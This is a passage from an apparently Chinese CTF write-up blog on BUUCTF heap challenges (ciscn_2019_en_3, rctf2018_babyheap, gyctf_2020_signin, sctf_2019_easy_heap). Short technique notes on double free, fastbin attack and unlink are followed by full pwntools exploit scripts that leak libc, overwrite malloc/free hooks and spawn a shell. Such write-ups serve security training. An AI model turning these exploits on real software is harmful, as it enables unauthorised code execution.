class="number">0x68</span>, b<span class="string">&quot;a&quot;</span>, <span class="number">0x68</span>, b<span class="string">&quot;c&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>, p64(malloc_hook_addr - <span class="number">0x23</span>), <span class="number">0x68</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x68</span>, b<span class="string">&quot;a&quot;</span>, <span class="number">0x68</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x13</span> + p64(libc_base + one_gadget[<span class="number">3</span>]))</span><br><span class="line">sla(b<span class="string">&quot;want to do :&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="meta"># debug()</span></span><br><span class="line">sla(b<span class="string">&quot;&gt; O&#x27;s length : &quot;</span>, str(<span class="number">0x10</span>).encode())</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a>ciscn_2019_en_3</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_en_3">BUUCTF在线评测</a></p>
<p>一个简简单单的double free</p>
<p>有一个_printf_chk,不能直接用%n$p,但还是可以直接多个%p</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./ciscn_2019_en_3&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">27134</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b </span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/10xg $rebase(0x202060)</span></span><br><span class="line"><span class="string">    x/xg $rebase(0x20204C)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"># 没洞</span><br><span class="line">def add(size: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;choice:&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;size of story: \n&quot;</span>, str(size).encode())</span><br><span class="line">    sa(b<span class="string">&quot;inpute the story: \n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"># 没有清空</span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;choice:&quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;input the index:\n&quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">sa(b<span class="string">&quot;name?\n&quot;</span>, b<span class="string">&quot;%p&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line">r(<span class="number">4</span>)</span><br><span class="line">libc_base = <span class="type">int</span>(r(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x7F9AECC0E081</span> + <span class="number">0x7F9AECAFE000</span></span><br><span class="line">free_hook_addr = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line">sa(b<span class="string">&quot;Please input your ID.\n&quot;</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x18</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>, p64(free_hook_addr))</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line"><span class="meta"># debug()</span></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h2 id="calloc"><a href="#calloc" class="headerlink" title="calloc"></a>calloc</h2><h3 id="rctf2018-babyheap"><a href="#rctf2018-babyheap" class="headerlink" title="rctf2018_babyheap"></a>rctf2018_babyheap</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#rctf2018_babyheap">BUUCTF在线评测</a></p>
<p>一个挺不错的题目</p>
<p>calloc不会调用tcache,所以只能用fastbin attack</p>
<p>unosrted bin unlink</p>
<p>还可以的题目</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./babyheap&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">25080</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot; </span></span><br><span class="line"><span class="string">    b  *$rebase(0xD3E)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/xg $rebase(0x202020)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"># &lt;=<span class="number">256</span> <span class="built_in">calloc</span> off by one</span><br><span class="line">def add(size: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sa(b<span class="string">&quot;choice: &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;chunk size: &quot;</span>, str(size).encode())</span><br><span class="line">    sla(b<span class="string">&quot;content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="meta"># def edit(index: int, content: bytes):</span></span><br><span class="line"><span class="meta">#     sa(b<span class="string">&quot;choice :&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span></span><br><span class="line"><span class="meta">#     sa(b<span class="string">&quot;Index: &quot;</span>, str(index).encode())</span></span><br><span class="line"><span class="meta">#     sa(b<span class="string">&quot;Size: &quot;</span>, str(len(content)).encode())</span></span><br><span class="line"><span class="meta">#     sa(b<span class="string">&quot;Data: &quot;</span>, content)</span></span><br><span class="line"></span><br><span class="line"># 清空了</span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sa(b<span class="string">&quot;choice: &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;index: &quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def show(index: <span class="type">int</span>):</span><br><span class="line">    sa(b<span class="string">&quot;choice: &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;index: &quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def convert_str_asmencode(content: str):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in content:</span><br><span class="line">        out = hex(ord(i))[<span class="number">2</span>:] + out</span><br><span class="line">    out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xF8</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0x68</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0xF8</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">9</span>, <span class="number">1</span>, <span class="number">-1</span>):</span><br><span class="line">    <span class="built_in">free</span>(i)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">7</span>):</span><br><span class="line">    <span class="built_in">free</span>(<span class="number">12</span> + i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">0x68</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x60</span> + p64(<span class="number">0x70</span> * <span class="number">10</span> + <span class="number">0x100</span>))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">11</span>)</span><br><span class="line">add(<span class="number">0xF8</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ru(b<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">libc_base = u64(rld().ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) - <span class="number">0x7FE03BD97CA0</span> + <span class="number">0x7FE03B9AC000</span></span><br><span class="line">add(<span class="number">0x48</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">malloc_hook_addr = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">add(<span class="number">0x28</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x18</span> + p64(<span class="number">0x71</span>) + p64(malloc_hook_addr - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x68</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x13</span> + p64(one_gadget[<span class="number">1</span>] + libc_base))</span><br><span class="line">sa(b<span class="string">&quot;choice: &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">sa(b<span class="string">&quot;chunk size: &quot;</span>, str(<span class="number">0x18</span>).encode())</span><br><span class="line"></span><br><span class="line">it()</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h3 id="gyctf-2020-signin"><a href="#gyctf-2020-signin" class="headerlink" title="gyctf_2020_signin"></a>gyctf_2020_signin</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#gyctf_2020_signin">BUUCTF在线评测</a></p>
<p>分析好libc源码，calloc不会从tcache中取，_int_malloc会把在fastbin的空闲块移到tcache</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./gyctf_2020_signin&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">25674</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *0x40148F</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/6xg 0x4040E0</span></span><br><span class="line"><span class="string">    x/6xg 0x404160</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">def add(size: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;your choice?&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;idx?\n&quot;</span>, str(size).encode())</span><br><span class="line"></span><br><span class="line">def edit(index: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;your choice?&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;idx?\n&quot;</span>, str(index).encode())</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line">def backdoor():</span><br><span class="line">    sla(b<span class="string">&quot;your choice?&quot;</span>, b<span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;your choice?&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;idx?\n&quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">8</span>):</span><br><span class="line">    add(i)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">8</span>):</span><br><span class="line">    <span class="built_in">free</span>(i)</span><br><span class="line">add(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">7</span>, p64(<span class="number">0x4040C0</span> - <span class="number">0x10</span>))</span><br><span class="line">backdoor()</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><h3 id="sctf-2019-easy-heap"><a href="#sctf-2019-easy-heap" class="headerlink" title="sctf_2019_easy_heap"></a>sctf_2019_easy_heap</h3><p>这个题目算是简单题，有些东西就忘了，大概就是传统的unlink打法，然后malloc_hook和main_area地址比较接近，只要bss有main_aren地址之后，就可以直接改偏移，然后打malloc_hook</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_path = &quot;./sctf_2019_easy_heap&quot;</span><br><span class="line">lib_path=&quot;&quot;</span><br><span class="line">#lib_path=&quot;/home/zhou/glibc-all-in-one/libs/2.27-3ubuntu1_amd64&quot;</span><br><span class="line">parm=elf_path</span><br><span class="line">#parm=[elf_path,&quot;127.0.0.1&quot;,&quot;3339&quot;]</span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=&quot;debug&quot;)</span><br><span class="line">if lib_path:</span><br><span class="line">    libc = ELF(f&quot;&#123;lib_path&#125;/libc.so.6&quot;)</span><br><span class="line">else:</span><br><span class="line">    libc=elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">    remote_ip = &quot;node4.buuoj.cn&quot;</span><br><span class="line">    remote_port = 27196</span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line">else:</span><br><span class="line">    if lib_path:</span><br><span class="line">        io = process(parm,env= &#123;&#x27;LD_LIBRARY_PATH&#x27;: lib_path&#125;)</span><br><span class="line">    else:</span><br><span class="line">        io = process(parm)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    global io</span><br><span class="line">    gdbscript = &quot;&quot;&quot;</span><br><span class="line">    b </span><br><span class="line">    c</span><br><span class="line">    x/20xg $rebase(0x202060)</span><br><span class="line">    x/xg $rebase(0x202040)</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug_force():</span><br><span class="line">    global io</span><br><span class="line">    io.close()</span><br><span class="line">    gdbscript = &quot;&quot;&quot;</span><br><span class="line">    b *$rebase(0x1134)</span><br><span class="line">    c</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if lib_path:</span><br><span class="line">        io=gdb.debug(parm,env= &#123;&#x27;LD_LIBRARY_PATH&#x27;: lib_path&#125;, gdbscript=gdbscript)</span><br><span class="line">    else:</span><br><span class="line">        io=gdb.debug(parm, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">#0x1000</span><br><span class="line">def add(size):</span><br><span class="line">    sla(b&quot;&gt;&gt; &quot;,b&quot;1&quot;)</span><br><span 